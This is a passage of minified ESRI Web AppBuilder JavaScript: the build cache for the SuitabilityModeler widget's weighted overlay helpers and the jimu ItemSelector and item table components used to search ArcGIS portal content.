// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/SuitabilityModeler/WroContext":function(){define(["dojo/_base/declare","./wro/Context","jimu/dijit/Message"],function(m,p,e){return m([p],{showError:function(e,a){a&&a.message?this.showMessage(e,a.message):this.showMessage(e,a)},showMessage:function(k,a){new e({titleLabel:k,message:a})},showMessages:function(k,a,d){var c,b,f;c=document.createElement("div");"string"===typeof a&&0<a.length&&(b=document.createElement("p"),b.appendChild(document.createTextNode(a)),c.appendChild(b));
b=document.createElement("ul");c.appendChild(b);for(a=0;a<d.length;a++)f=document.createElement("li"),f.appendChild(document.createTextNode(d[a])),b.appendChild(f);new e({titleLabel:k,message:c})}})})},"widgets/SuitabilityModeler/wro/Context":function(){define(["dojo/_base/declare","dojo/_base/lang"],function(m,p){return m([],{allowSaveAs:!0,i18n:null,constructor:function(e){p.mixin(this,e)},checkMixedContent:function(e){"string"===typeof window.location.href&&0===window.location.href.indexOf("https://")&&
"string"===typeof e&&0===e.indexOf("http://")&&(e="https:"+e.substring("5"));return e},generateRandomId:function(){var e=null,e="function"===typeof Date.now?Date.now():(new Date).getTime(),k=(""+Math.random()).replace("0.","r");return(e+""+k).replace(/-/g,"")},getMap:function(){return null},showError:function(e,k){console.warn("wro/Context.showError",e,k)},showMessage:function(e,k){console.warn("wro/Context.showMessage",e,k)},showMessages:function(e,k,a){console.warn("wro/Context.showMessages",e,
k,a)}})})},"widgets/SuitabilityModeler/wro/wroUtil":function(){define(["dojo/_base/lang","dojo/_base/array","dojo/Deferred","esri/layers/RasterFunction"],function(m,p,e,k){return{serverSideRasterFunctionName:"WeightedOverlay_7_1_9_colormap",applyItemDataRenderingRule:function(a,d,c){var b;try{this.isServerSideWRORule(c)?(b=new k,b.functionName=c.renderingRule.rasterFunction||c.renderingRule.functionName,b.arguments=c.renderingRule.rasterFunctionArguments||c.renderingRule.arguments,b.variableName=
c.renderingRule.variableName,a.setRenderingRule(b,!1)):c&&c.renderingRule&&d.supportsClientSideWRO&&(b=new k(c.renderingRule),a.setRenderingRule(b,!1))}catch(f){console.error(f)}},hasServerSideWROFunction:function(a){var d=this.serverSideRasterFunctionName;return a&&(this.isServerSideWRORule(a)||a.rasterFunctionInfos&&p.some(a.rasterFunctionInfos,function(a){if(a&&a.name===d)return!0}))?!0:!1},isServerSideWRORule:function(a){var d=this.serverSideRasterFunctionName;return a&&a.renderingRule&&a.renderingRule.rasterFunction&&
a.renderingRule.rasterFunction===d||a&&a.renderingRule&&a.renderingRule.functionName&&a.renderingRule.functionName===d?!0:!1},makeItemData:function(a,d){a=a.designModelView.weightedOverlayService.modelToImageServiceLayer(d,{modelTitle:"New Model"});d={};m.mixin(d,a);delete d.id;delete d.url;delete d.opacity;delete d.title;return d},newWROInfo:function(){return{isGETen3:!1,isWROLayer:!1,isWROModel:!1,hasServerSideWROFunction:!1,supportsClientSideWRO:!1}},validateWROLayer:function(a,d,c,b,f){var q=
new e,h="Title Url Description InputRanges OutputValues NoDataRanges RangeLabels NoDataRangeLabels".split(" "),k=!1;c.isGETen3=10.3<=d.version;c.hasServerSideWROFunction=this.hasServerSideWROFunction(d);if(c.isGETen3){d.allowRasterFunction||b.push(a.wro.validation.notAllowRasterFunction);d.defaultResamplingMethod&&"Nearest"===d.defaultResamplingMethod||b.push(a.wro.validation.notNearestResampling);var m=[];d.fields&&(m=d.fields);p.forEach(h,function(n){p.some(m,function(a){return n===a.name})||b.push(a.wro.validation.missingFieldPattern.replace("{field}",
n))});0<b.length&&!f&&(k=!1);k?d.getKeyProperties().then(function(n){"undefined"!==typeof n&&null!==n&&n.IsWeightedOverlay?c.supportsClientSideWRO=!0:b.push(a.wro.validation.notIsWeightedOverlayProp);q.resolve()},function(a){q.reject(a)}):(0===b.length&&(c.supportsClientSideWRO=!0),q.resolve())}else c.hasServerSideWROFunction||b.push(a.wro.validation.notAWroService),q.resolve();return q},waitForLayer:function(a,d){var c=new e,b=[];if(a.loaded)return c.resolve(a),c;if(a.loadError)return c.reject(a.loadError),
c;var f=function(){p.forEach(b,function(a){a.remove()})};b.push(a.on("load",function(a){f();c.resolve(a.layer)}));b.push(a.on("error",function(a){f();a=a.error;try{a.message&&-1!==a.message.indexOf("Unable to complete")?(console.warn("layerAccessError",a),c.reject(Error(d.wro.validation.inaccessible))):c.reject(a)}catch(h){c.reject(a)}}));return c}}})},"jimu/dijit/ItemSelector":function(){define("dojo/_base/declare dojo/topic dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./templates/ItemSelector.html dojo/Evented dojo/_base/lang dojo/_base/config dojo/_base/array dojo/_base/html dojo/_base/Deferred dojo/promise/all dojo/query dojo/on jimu/utils jimu/portalUtils jimu/tokenUtils jimu/portalUrlUtils jimu/dijit/ViewStack jimu/dijit/Search jimu/dijit/TabContainer3 jimu/dijit/_ItemTable".split(" "),
function(m,p,e,k,a,d,c,b,f,q,h,x,w,n,l,u,r,t,v,z,A,y,B){return m([e,k,a,c],{templateString:d,declaredClass:"jimu.dijit.ItemSelector",baseClass:"jimu-item-selector",tab:null,_user:null,_group:null,_allPublicPortalQuery:null,_filterPublicPortalQuery:null,_allPublicOnlineQuery:null,_filterPublicOnlineQuery:null,_allOrganizationQuery:null,_filterOrganizationQuery:null,_allMyContentQuery:null,_filterMyContentQuery:null,_allGroupQuery:null,_filterGroupQuery:null,_isPublicTabShow:!1,_signIn:!1,_itemTypeQueryString:"",
_typeKeywordQueryString:"",portalUrl:null,itemTypes:"",typeKeywords:"",showOnlineItems:!0,onlyShowOnlineFeaturedItems:!1,postMixInProperties:function(){this.portalUrl=v.getStandardPortalUrl(this.portalUrl);this.showOnlineItems=!1===this.showOnlineItems?!1:!0;this.itemTypes&&0<this.itemTypes.length||(this.itemTypes=[]);this._itemTypes="";q.forEach(this.itemTypes,b.hitch(this,function(g,a){this._itemTypes+='"'+g+'"';a!==this.itemTypes.length-1&&(this._itemTypes+=",")}));this._itemTypes="["+this._itemTypes+
"]";this.typeKeywords&&0<this.typeKeywords.length||(this.typeKeywords=[]);this._typeKeywords="";q.forEach(this.typeKeywords,b.hitch(this,function(g,a){this._typeKeywords+='"'+g+'"';a!==this.typeKeywords.length-1&&(this._typeKeywords+=",")}));this._typeKeywords="["+this._typeKeywords+"]";this.nls=window.jimuNls.itemSelector},postCreate:function(){this.inherited(arguments);var g=this._getPortalUrl();this.portal=r.getPortal(g);this._initOptions();this._initSearchQuery();this._initTabs();this._initPortalRadio();
this._initItemTables();this._initPublic();this._initPrivate();this._updateUIbySignIn()},_initOptions:function(){this._itemTypeQueryString=u.getItemQueryStringByTypes(this.itemTypes);this._typeKeywordQueryString=u.getItemQueryStringByTypeKeywords(this.typeKeywords)},_initTabs:function(){this.tab=new y({tabs:[{title:this.nls.myContent,content:this.mycontentTabNode},{title:this.nls.myOrganization,content:this.organizationTabNode},{title:this.nls.myGroup,content:this.groupTabNode},{title:this.nls.publicMap,
content:this.publicTabNode}]},this.tabNode);this.own(l(this.tab,"tabChanged",b.hitch(this,function(g){h.setStyle(this.signinSection,"display","none");g!==this.nls.publicMap?(this._isPublicTabShow=!1,this._updateUIbySignIn()):this._isPublicTabShow=!0})))},_updateUIbySignIn:function(){h.setStyle(this.signinSection,"display","none");var g=n(".organization-tab-content-main,.group-tab-content-main,.mycontent-tab-content-main",this.domNode);t.userHaveSignInPortal(this._getPortalUrl())?g.style("display",
"block"):(g.style("display","none"),this._isPublicTabShow||h.setStyle(this.signinSection,"display","block"))},_initPortalRadio:function(){u.combineRadioCheckBoxWithLabel(this.portalPublicRaido,this.portalPublicLabel);u.combineRadioCheckBoxWithLabel(this.onlinePublicRaido,this.onlinePublicLabel);var g=this._getPortalUrl(),g=v.getServerByUrl(g);this.portalPublicRaido.disabled=!1;this.onlinePublicRaido.disabled=!1;this.portalPublicRaido.checked=!0;var a=!1;v.isArcGIScom(g)?(a=!0,this.portalPublicLabel.innerHTML=
"ArcGIS.com"):(this.portalPublicLabel.innerHTML=g,a=this.showOnlineItems?!1:!0);a&&(this.onlinePublicRaido.disabled=!0,h.setStyle(this.onlinePublicRaido,"display","none"),h.setStyle(this.onlinePublicLabel,"display","none"))},_initSearchQuery:function(){var g="esri_"+(f.locale&&f.locale.slice(0,2)||"en").toLowerCase(),a=q.filter("esri_he esri_fr esri_ja esri_nl esri_th esri_tr esri_nb esri_ro esri_it esri_pl esri_po esri_ru esri_pt esri_en esri_ar esri_et esri_es esri_ko esri_cs esri_da esri_zh esri_sv esri_lt esri_fi esri_lv esri_de esri_vi".split(" "),
b.hitch(this,function(a){return a!==g})),r="";q.forEach(a,b.hitch(this,function(a){r+=" -owner:"+a+" "}));a=" ";this.portal&&this.portal.user&&this.portal.user.orgId&&(a=" orgid:"+this.portal.user.orgId+" ");a=a+this._itemTypeQueryString+" AND access:public "+r+" "+this._typeKeywordQueryString;this._allPublicPortalQuery=this._getQuery({sortField:"numViews",sortOrder:"desc",q:a});this._filterPublicPortalQuery=this._getQuery({q:a,basicQ:a});this._allPublicOnlineQuery=this._getQuery({sortField:"numViews",
sortOrder:"desc",q:(this.onlyShowOnlineFeaturedItems?' (group:"c755678be14e4a0984af36a15f5b643e"  OR group:"b8787a74b4d74f7fb9b8fac918735153") ':" ")+this._itemTypeQueryString+" AND access:public "+this._typeKeywordQueryString});this._filterPublicOnlineQuery=this._getQuery({q:this._itemTypeQueryString+" AND access:public "+this._typeKeywordQueryString});this._allOrganizationQuery=this._getQuery();this._filterOrganizationQuery=this._getQuery();this._allMyContentQuery=this._getQuery();this._filterMyContentQuery=
this._getQuery();this._allGroupQuery=this._getQuery();this._filterGroupQuery=this._getQuery()},_getQuery:function(a){return b.mixin({start:1,num:16,f:"json"},a||{})},_getPortalUrl:function(){return v.getStandardPortalUrl(this.portalUrl)},_initItemTables:function(){"function"===typeof this.onCreateItemContent&&(this.mycontentItemTable.onCreateItemContent=this.onCreateItemContent,this.organizationItemTable.onCreateItemContent=this.onCreateItemContent,this.groupItemTable.onCreateItemContent=this.onCreateItemContent,
this.publicPortalItemTable.onCreateItemContent=this.onCreateItemContent,this.publicOnlineItemTable.onCreateItemContent=this.onCreateItemContent);this.own(l(this.publicPortalItemTable,"item-dom-clicked",b.hitch(this,this._onItemDomClicked)));this.own(l(this.publicOnlineItemTable,"item-dom-clicked",b.hitch(this,this._onItemDomClicked)));this.own(l(this.organizationItemTable,"item-dom-clicked",b.hitch(this,this._onItemDomClicked)));this.own(l(this.groupItemTable,"item-dom-clicked",b.hitch(this,this._onItemDomClicked)));
this.own(l(this.mycontentItemTable,"item-dom-clicked",b.hitch(this,this._onItemDomClicked)));this.own(l(this.publicPortalItemTable,"update",b.hitch(this,this._onItemTableUpdate)));this.own(l(this.publicOnlineItemTable,"update",b.hitch(this,this._onItemTableUpdate)));this.own(l(this.organizationItemTable,"update",b.hitch(this,this._onItemTableUpdate)));this.own(l(this.groupItemTable,"update",b.hitch(this,this._onItemTableUpdate)));this.own(l(this.mycontentItemTable,"update",b.hitch(this,this._onItemTableUpdate)));
var a=this._getPortalUrl();this.portalPublicRaido.disabled||(this.publicPortalItemTable.set("portalUrl",a),this.publicPortalItemTable.searchAllItems(this._allPublicPortalQuery),this.publicPortalItemTable.set("filteredQuery",this._filterPublicPortalQuery));this.onlinePublicRaido.disabled||(this.publicOnlineItemTable.set("portalUrl",window.location.protocol+"//www.arcgis.com"),this.publicOnlineItemTable.searchAllItems(this._allPublicOnlineQuery),this.publicOnlineItemTable.set("filteredQuery",this._filterPublicOnlineQuery))},
_initPublic:function(){this.own(l(this.portalPublicRaido,"click",b.hitch(this,this._onPublicRaidoClicked)));this.own(l(this.onlinePublicRaido,"click",b.hitch(this,this._onPublicRaidoClicked)));this._onPublicRaidoClicked()},_onPublicRaidoClicked:function(){this.portalPublicRaido.checked?(this.publicPortalItemTable.show(),this.publicOnlineItemTable.hide()):this.onlinePublicRaido.checked&&(this.publicPortalItemTable.hide(),this.publicOnlineItemTable.show())},_onPublicSearch:function(a){(a=a&&b.trim(a))?
(this.publicPortalItemTable.showFilterItemsSection(),this.publicOnlineItemTable.showFilterItemsSection(),this.portalPublicRaido.checked?(this._filterPublicPortalQuery.q=a+" "+this._filterPublicPortalQuery.basicQ,this._filterPublicPortalQuery.start=1,this.publicPortalItemTable.searchFilteredItems(this._filterPublicPortalQuery)):this.onlinePublicRaido.checked&&(this._filterPublicOnlineQuery.q=a+" "+this._itemTypeQueryString+" AND access:public "+this._typeKeywordQueryString,this._filterPublicOnlineQuery.start=
1,this.publicOnlineItemTable.searchFilteredItems(this._filterPublicOnlineQuery))):(this.publicPortalItemTable.showAllItemsSection(),this.publicOnlineItemTable.showAllItemsSection())},_initPrivate:function(){this._resetPortalMaps();this.own(l(this.groupsSelect,"change",b.hitch(this,this._onGroupsSelectChange)));var a=v.getServerByUrl(this._getPortalUrl());v.isArcGIScom(a)&&(a="ArcGIS.com");t.userHaveSignInPortal(this._getPortalUrl())&&this._onSignIn()},_onOrganizationSearch:function(a){if(a=a&&b.trim(a)){if(this._allOrganizationQuery){var g=
this._allOrganizationQuery.q;g&&(this._filterOrganizationQuery.q=a+" "+g,this._filterOrganizationQuery.start=1,this.organizationItemTable.searchFilteredItems(this._filterOrganizationQuery))}}else this.organizationItemTable.showAllItemsSection()},_onMyContentSearch:function(a){if(a=a&&b.trim(a)){if(this._allMyContentQuery){var g=this._allMyContentQuery.q;g&&(this._filterMyContentQuery.q=a+" "+g,this._filterMyContentQuery.start=1,this.mycontentItemTable.searchFilteredItems(this._filterMyContentQuery))}}else this.mycontentItemTable.showAllItemsSection()},
_onGroupSearch:function(a){if(a=a&&b.trim(a)){if(this._allGroupQuery){var g=this._allGroupQuery.q;g&&(this._filterGroupQuery.q=a+" "+g,this._filterGroupQuery.start=1,this.groupItemTable.searchFilteredItems(this._filterGroupQuery))}}else this.groupItemTable.showAllItemsSection()},_onSignIn:function(){this._updateUIbySignIn();if(!this._signIn){this._signIn=!0;var a=this._getPortalUrl();r.getPortal(a).getUser().then(b.hitch(this,function(a){this.domNode&&(this._resetPortalMaps(),this._searchOrganization(a),
this._searchMyContent(a),this._searchGroups(a))}))}},_onSignOut:function(){this._signIn=!1;this._resetPortalMaps();this._updateUIbySignIn()},_resetPortalMaps:function(){this.organizationItemTable.clear();this.mycontentItemTable.clear();this._resetGroupsSection()},_searchOrganization:function(a){this.organizationItemTable.clear();a=" orgid:"+a.orgId+" AND "+this._itemTypeQueryString+" AND (access:org OR access:public) "+this._typeKeywordQueryString;var g=this._getPortalUrl();this._allOrganizationQuery=
this._getQuery({q:a});this._filterOrganizationQuery=this._getQuery({q:a});this.organizationItemTable.set("portalUrl",g);this.organizationItemTable.searchAllItems(this._allOrganizationQuery)},_searchMyContent:function(a){this.mycontentItemTable.clear();var g=this._getPortalUrl();a="owner:"+a.username+" AND "+this._itemTypeQueryString+" "+this._typeKeywordQueryString;this._allMyContentQuery=this._getQuery({q:a});this._filterMyContentQuery=this._getQuery({q:a});this.mycontentItemTable.set("portalUrl",
g);this.mycontentItemTable.searchAllItems(this._allMyContentQuery)},_searchGroups:function(a){this._resetGroupsSection();h.setStyle(this.groupsSection,"display","block");a=a.getGroups();if(0<a.length){h.setStyle(this.groupSearch.domNode,"display","block");this.groupItemTable.show();h.empty(this.groupsSelect);for(var b=0;b<a.length;b++){var r=a[b];h.create("option",{value:r.id,innerHTML:r.title},this.groupsSelect)}this._onGroupsSelectChange()}this._updateUIbyGroups(a.length)},_resetGroupsSection:function(){h.setStyle(this.groupsSection,
"display","none");h.empty(this.groupsSelect);h.create("option",{value:"nodata",innerHTML:this.nls.noneGroups},this.groupsSelect);this.groupItemTable.clear();h.setStyle(this.groupSearch.domNode,"display","none");this.groupItemTable.hide();this._updateUIbyGroups(0)},_updateUIbyGroups:function(a){0===a?h.setStyle(this.groupsSection,"top","15px"):h.setStyle(this.groupsSection,"top","50px")},_onGroupsSelectChange:function(){var a=this.groupsSelect.value;this.groupItemTable.clear();if("nodata"===a)h.setStyle(this.groupSearch,
"display","none"),this.groupItemTable.hide();else{h.setStyle(this.groupSearch,"display","block");this.groupItemTable.show();var b=this._getPortalUrl(),a="group:"+a+" AND "+this._itemTypeQueryString+" "+this._typeKeywordQueryString;this._allGroupQuery=this._getQuery({q:a});this._filterGroupQuery=this._getQuery({q:a});this.groupItemTable.set("portalUrl",b);this.groupItemTable.searchAllItems(this._allGroupQuery)}},_onItemTableUpdate:function(){this.emit("update")},_onItemDomClicked:function(a){var b=
h.hasClass(a,"jimu-state-active");n(".item.jimu-state-active",this.domNode).removeClass("jimu-state-active");b&&h.addClass(a,"jimu-state-active");(a=this.getSelectedItem())?this.emit("item-selected",a):this.emit("none-item-selected")},getSelectedItem:function(){var a=null,r=n(".item.jimu-state-active",this.domNode);0<r.length&&(a=b.mixin({},r[0].item));return a}})})},"jimu/dijit/_ItemTable":function(){define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./templates/_ItemTable.html dojo/Evented dojo/_base/lang dojo/_base/array dojo/_base/html dojo/_base/Deferred dojo/query dojo/on jimu/utils jimu/portalUtils jimu/portalUrlUtils jimu/dijit/LoadingIndicator".split(" "),
function(m,p,e,k,a,d,c,b,f,q,h,x,w,n,l,u){return m([p,e,k,d],{templateString:a,declaredClass:"jimu.dijit.ItemTable",baseClass:"jimu-item-table",query:null,filteredQuery:null,portalUrl:null,hidden:!1,nls:null,types:"",typeKeywords:"",_defaultThumbnail:{"Web Mapping Application":"webapp.png","Mobile Application":"mobileapp.png"},postMixInProperties:function(){this.nls=window.jimuNls.itemSelector},postCreate:function(){this.inherited(arguments);this._initSelf()},_initSelf:function(){this.types&&0<this.types.length||
(this.types=[]);(this.hidden=!0===this.hidden)&&this.hide();this.portalUrl&&(this.portalUrl=l.getStandardPortalUrl(this.portalUrl));this.showAllItemsSection();this.searchAllItems()},show:function(){f.setStyle(this.domNode,"display","block")},hide:function(){f.setStyle(this.domNode,"display","none")},searchAllItems:function(a){this.showAllItemsSection();a&&(this.query=c.mixin({},a),this.query.start=1,this.clearAllItemsSection());this.portalUrl&&this.query&&0<this.query.start&&(this.allItemsShelter.show(),
n.getPortal(this.portalUrl).queryItems(this.query).then(c.hitch(this,function(a){this.domNode&&(this.allItemsShelter.hide(),this.query.start=a.nextStart,this._createItems(a,this.allItemTbody))}),c.hitch(this,function(a){console.error(a);this.domNode&&this.allItemsShelter.hide()})))},searchFilteredItems:function(a){this.showFilterItemsSection();a&&(this.filteredQuery=c.clone(a),this.filteredQuery.start=1,this.clearFilteredItemsSection());this.portalUrl&&this.filteredQuery&&0<this.filteredQuery.start&&
(this.filteredItemShelter.show(),n.getPortal(this.portalUrl).queryItems(this.filteredQuery).then(c.hitch(this,function(b){this.domNode&&(this.showFilterItemsSection(),a&&this.clearFilteredItemsSection(),this.filteredQuery.start=b.nextStart,this._createItems(b,this.filteredItemsTbody),this._filterItemCallback())}),c.hitch(this,function(a){console.error(a);this.domNode&&this._filterItemCallback()})))},_filterItemCallback:function(){this.filteredItemShelter.hide();0<this._getItemCount(this.filteredItemsTbody)?
(f.setStyle(this.filteredItemsTableDiv,"display","block"),f.setStyle(this.searchNoneTipSection,"display","none")):(f.setStyle(this.filteredItemsTableDiv,"display","none"),f.setStyle(this.searchNoneTipSection,"display","block"))},clear:function(){this.clearAllItemsSection();this.clearFilteredItemsSection()},clearAllItemsSection:function(){f.empty(this.allItemTbody)},clearFilteredItemsSection:function(){f.empty(this.filteredItemsTbody)},showAllItemsSection:function(){f.setStyle(this.allItemsSection,
"display","block");f.setStyle(this.filteredItemsSection,"display","none")},showFilterItemsSection:function(){f.setStyle(this.allItemsSection,"display","none");f.setStyle(this.filteredItemsSection,"display","block");f.setStyle(this.filteredItemsTableDiv,"display","block");f.setStyle(this.searchNoneTipSection,"display","none")},_onAllItemsSectionScroll:function(){this._isScrollToBottom(this.allItemsTableDiv)&&this.searchAllItems()},_onFilteredItemsSectionScroll:function(){this._isScrollToBottom(this.filteredItemsTableDiv)&&
this.searchFilteredItems()},_isScrollToBottom:function(a){return w.isScrollToBottom(a)},_createItems:function(a,n){a=a.results;var r=b.map(this.types,c.hitch(this,function(a){return a.toLowerCase()}));a=b.filter(a,c.hitch(this,function(a){a=a.type&&a.type.toLowerCase()||"";return 0<=b.indexOf(r,a)}));if(0!==a.length){var d,l=h("td.empty",n),t;if(0<l.length){var e=Math.min(a.length,l.length),g=a.splice(0,e);for(t=0;t<e;t++){var k=l[t];d=this._createItem(g[t]);f.place(d,k);f.removeClass(k,"empty")}}if(0!==
a.length){l=Math.ceil(a.length/2);for(t=0;t<l;t++)for(d=f.toDom("\x3ctr\x3e\x3ctd\x3e\x3c/td\x3e\x3ctd\x3e\x3c/td\x3e\x3c/tr\x3e"),f.place(d,n),e=h("td",d),g=0;g<e.length;g++)k=e[g],(d=a[2*t+g])?(d=this._createItem(d),f.place(d,k)):f.addClass(k,"empty");this.emit("update")}}},_getItemCount:function(a){return h(".item",a).length},_createItem:function(a){var b=f.toDom('\x3cdiv class\x3d"item"\x3e\x3cdiv class\x3d"item-border"\x3e\x3c/div\x3e\x3cdiv class\x3d"item-thumbnail jimu-auto-vertical"\x3e\x3cdiv class\x3d"none-thumbnail-tip jimu-auto-vertical-content"\x3e\x3c/div\x3e\x3c/div\x3e\x3cdiv class\x3d"item-info"\x3e\x3cdiv class\x3d"item-name"\x3e\x3c/div\x3e\x3cdiv class\x3d"item-type-owner"\x3e\x3c/div\x3e\x3cdiv class\x3d"item-date"\x3e\x3c/div\x3e\x3ca class\x3d"item-details" target\x3d"_blank"\x3e\x3c/a\x3e\x3c/div\x3e\x3c/div\x3e');
b.item=a;var d=h(".item-thumbnail",b)[0],n=h(".item-name",b)[0],c=h(".item-type-owner",b)[0],l=h(".item-date",b)[0],e=h(".item-details",b)[0],g=h(".none-thumbnail-tip",b)[0];if(!a.thumbnailUrl){var r=this._defaultThumbnail[a.type];r&&(a.thumbnailUrl=require.toUrl("jimu")+"/images/"+r)}a.thumbnailUrl?f.setStyle(d,"backgroundImage","url("+a.thumbnailUrl+")"):g.innerHTML=this.nls.noneThumbnail;"function"===typeof this.onCreateItemContent?(l=h(".item-info",b)[0],this.onCreateItemContent(a,l)):(n.innerHTML=
a.title,n.title=n.innerHTML,c.innerHTML=a.type+" by "+a.owner,c.title=c.innerHTML,d=new Date,d.setTime(a.modified),l.innerHTML=d.toLocaleString(),l.title=l.innerHTML,e.innerHTML=this.nls.moreDetails,e.href=a.detailsPageUrl||"#");return b},_onItemsTableClicked:function(a){var b=a.target||a.srcElement;a=null;f.hasClass(b,"item-thumbnail")?a=b.parentNode:f.hasClass(b,"none-thumbnail-tip")&&(a=b.parentNode.parentNode);a&&(b=f.hasClass(a,"jimu-state-active"),h(".item.jimu-state-active",this.domNode).removeClass("jimu-state-active"),
b?f.removeClass(a,"jimu-state-active"):f.addClass(a,"jimu-state-active"),this.emit("item-dom-clicked",a))},getSelectedItem:function(){var a=null,b=h(".item.jimu-state-active",this.domNode);0<b.length&&(a=c.mixin({},b[0].item));return a}})})},"widgets/SuitabilityModeler/setting/_build-generate_module":function(){define(["dojo/text!./Setting.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:jimu/dijit/templates/ItemSelector.html":'\r\n\x3cdiv\x3e\r\n\t\x3cdiv class\x3d"setting-tab-container"\x3e\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"tabNode"\x3e\x3c/div\x3e\r\n\r\n\t\t\x3cdiv class\x3d"tab-content mycontent-tab" data-dojo-attach-point\x3d"mycontentTabNode"\x3e\r\n\t\t\t\x3cdiv class\x3d"tab-content-main mycontent-tab-content-main"\x3e\r\n\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"mycontentSearch" data-dojo-type\x3d"jimu/dijit/Search" data-dojo-props\x3d\'searchWhenInput:false\' data-dojo-attach-event\x3d"onSearch:_onMyContentSearch" style\x3d"position:absolute;width:100%;top:0;"\x3e\x3c/div\x3e\r\n\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"mycontentItemTable" data-dojo-type\x3d"jimu/dijit/_ItemTable" data-dojo-props\x3d\'types:${_itemTypes},typeKeywords:${_typeKeywords}\' style\x3d"top:50px;"\x3e\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\r\n\t\t\x3cdiv class\x3d"tab-content organization-tab" data-dojo-attach-point\x3d"organizationTabNode"\x3e\r\n\t\t\t\x3cdiv class\x3d"tab-content-main organization-tab-content-main"\x3e\r\n\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"organizationSearch" data-dojo-type\x3d"jimu/dijit/Search" data-dojo-props\x3d\'searchWhenInput:false\' data-dojo-attach-event\x3d"onSearch:_onOrganizationSearch" style\x3d"position:absolute;width:100%;top:0;"\x3e\x3c/div\x3e\r\n\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"organizationItemTable" data-dojo-type\x3d"jimu/dijit/_ItemTable" data-dojo-props\x3d\'types:${_itemTypes},typeKeywords:${_typeKeywords}\' style\x3d"top:50px;"\x3e\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\r\n\t\t\x3cdiv class\x3d"tab-content group-tab" data-dojo-attach-point\x3d"groupTabNode"\x3e\r\n\t\t\t\x3cdiv class\x3d"tab-content-main group-tab-content-main"\x3e\r\n\t\t\t\t\x3cdiv class\x3d"groups-section" style\x3d"position:absolute;width:100%;top:50px;" data-dojo-attach-point\x3d"groupsSection"\x3e\r\n\t\t\t\t\t\x3cspan\x3e${nls.groups}:\x3c/span\x3e\r\n\t\t\t\t\t\x3cselect class\x3d"groups-select" data-dojo-attach-point\x3d"groupsSelect"\x3e\r\n\t\t\t\t\t\t\x3coption value\x3d"nodata"\x3e${nls.noneGroups}\x3c/option\x3e\r\n\t\t\t\t\t\x3c/select\x3e\r\n\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"groupSearch" data-dojo-type\x3d"jimu/dijit/Search" data-dojo-props\x3d\'searchWhenInput:false\' data-dojo-attach-event\x3d"onSearch:_onGroupSearch" style\x3d"position:absolute;width:100%;top:0;"\x3e\x3c/div\x3e\r\n\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"groupItemTable" data-dojo-type\x3d"jimu/dijit/_ItemTable" data-dojo-props\x3d\'types:${_itemTypes},typeKeywords:${_typeKeywords}\' style\x3d"top:85px;"\x3e\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\r\n\t\t\x3cdiv class\x3d"tab-content public-tab" data-dojo-attach-point\x3d"publicTabNode"\x3e\r\n\t\t\t\x3cdiv class\x3d"tab-content-main public-tab-content-main"\x3e\r\n\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"publicSearch" data-dojo-type\x3d"jimu/dijit/Search" data-dojo-props\x3d\'searchWhenInput:false\' data-dojo-attach-event\x3d"onSearch:_onPublicSearch" style\x3d"position:absolute;width:100%;top:0;"\x3e\x3c/div\x3e\r\n\t\t\t\t\x3cdiv class\x3d"public-search-radios"\x3e\r\n\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"portalPublicRaido" type\x3d"radio" name\x3d"publicSearchRadio" class\x3d"jimu-float-leading portal-public-radio jimu-radio-btn" /\x3e\r\n\t\t\t\t\t\x3clabel data-dojo-attach-point\x3d"portalPublicLabel" class\x3d"jimu-float-leading portal-public-label"\x3ePortal\x3c/label\x3e\r\n\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"onlinePublicRaido" type\x3d"radio" name\x3d"publicSearchRadio" class\x3d"jimu-float-leading online-public-radio jimu-radio-btn" /\x3e\r\n\t\t\t\t\t\x3clabel data-dojo-attach-point\x3d"onlinePublicLabel" class\x3d"jimu-float-leading online-public-label"\x3eArcGIS Online\x3c/label\x3e\r\n\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"publicItemSection" class\x3d"public-item-section"\x3e\r\n\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"publicPortalItemTable" data-dojo-type\x3d"jimu/dijit/_ItemTable" data-dojo-props\x3d\'types:${_itemTypes},typeKeywords:${_typeKeywords}\'\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"publicOnlineItemTable" data-dojo-type\x3d"jimu/dijit/_ItemTable" data-dojo-props\x3d\'types:${_itemTypes},typeKeywords:${_typeKeywords}\'\x3e\x3c/div\x3e\r\n\t\t\t\t\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv class\x3d"signin-section" data-dojo-attach-point\x3d"signinSection" style\x3d"display:none;"\x3e\r\n\t\t\x3cdiv class\x3d"signin-tip"\x3e${nls.signInTip}\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\x3c/div\x3e',
